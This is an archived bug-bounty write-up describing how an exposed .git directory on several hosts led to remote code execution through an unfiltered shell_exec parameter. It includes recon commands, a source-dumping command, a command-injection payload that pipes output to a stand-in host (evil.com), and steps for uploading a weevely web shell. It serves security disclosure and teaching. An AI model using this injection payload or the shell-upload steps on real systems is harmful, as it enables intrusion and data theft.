# $10.000 bounty for exposed .git to RCE

- **Source URL:** https://medium.com/@levshmelevv/10-000-bounty-for-exposed-git-to-rce-304c7e1f54?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240101143148/https://medium.com/@levshmelevv/10-000-bounty-for-exposed-git-to-rce-304c7e1f54
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/1845 (id 1845)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# $10.000 bounty for exposed .git to RCE

--

Recently i participated in one of the private bugbounty programs where I managed to find RCE through the open .git directory on four hosts for which I received a record $10,000 and it would be a crime not to share it.

In fact, the vulnerability was as very simple and it took only half a day, but about everything in order…

The main stage of collecting low-hanging bugs is recon, for which I use a chain of tools in my bash script:

```
amass enum -active -d $1 -brute -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o amass.txt
cat amass.txt | aquatone -ports xlarge -out aqua_$1
nuclei -l aqua_$1/aquatone_urls.txt -t ~/nuclei-templates -es info -o nuclei_$1.txt
```
This is not the most detailed recon, you can add other tools at your discretion, but it is designed to scan a large amount of hosts

Fortunately, the output of [**nuclei**](https://github.com/projectdiscovery/nuclei) showed me the exposed .git/ directories on several hosts through which it was possible to download the sources

To do this, use the [**git-dumper**](https://github.com/arthaud/git-dumper) tool:

`git-dumper http://example.com/.git/ output`
I thought this was a great opportunity to look for serious issues in the code and did not rush to report exposed .git

And so it turned out that in the code they used a call to local bash scripts to save and delete ftp users via the ***shell\_exec()*** function, which took an unfiltered userinput, which led to the RCE vulnerability

To craft the request, I also had to take into account a simple validation that required hardcoded secret keys

And the final result of the request:

*http://example.com/ftp-upload/sync.php?deluser=someuser&secret1=\[secret1\]&secret2=\[sha1 encoded secret2\]*

where the entry point will be the ***deluser*** parameter

The next step was to validate the vulnerability itself, for which I made a test curl request to my server via injection into ***shell\_exec()***, which worked successfully

It was also possible to read the output of commands by sending it either to the URI or via the POST body in base64 encoded form like that:

Payload for ***id*** command:

*someusr; curl https://evil.com/$(id|base64|tr -d “\n”);*


So it only remained to upload the shell, the only obstacle was the lack of write rights to the current directory, so the shell was uploaded to ***uploads/***
(to generate the shell, I used the [**weevely**](https://github.com/epinna/weevely3) tool)

If describe this process in steps:

1. Save the shell locally in txt to be able to transfer it via curl, and raise the server on own host
2. Raise the tunnel with ngrok
3. Send a payload that will save our shell in ***uploads/shell.php***

And it remains to connect to the uploaded shell using **weevely**

After several days of help with fixing the issue, the company rewarded me with a bounty (motivational screenshot is attached;))

At the end, I want to say that in 9 out of 10 cases I did not receive anything, there were different companies that deceived me and it’s all about patience and consistency

Reach me on [Linkedin](https://www.linkedin.com/in/levsaar/)
